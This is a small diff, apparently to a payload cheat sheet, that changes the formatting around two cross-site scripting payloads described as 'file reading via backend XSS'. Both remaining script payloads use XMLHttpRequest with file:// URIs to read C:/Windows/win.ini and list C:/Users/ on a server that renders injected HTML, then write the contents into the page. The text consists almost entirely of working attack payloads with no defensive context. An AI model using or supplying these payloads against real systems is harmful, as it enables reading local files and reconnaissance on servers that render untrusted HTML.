@@ -1,8 +1,7 @@
-<b>Simple file reading via backend XSS:
+Simple file reading via backend XSS:
 
-```
 <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///C:/Windows/win.ini"); x.send(); </script>
-```
+
 Catalogs listing:
 
 <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///C:/Users/"); x.send(); </script>
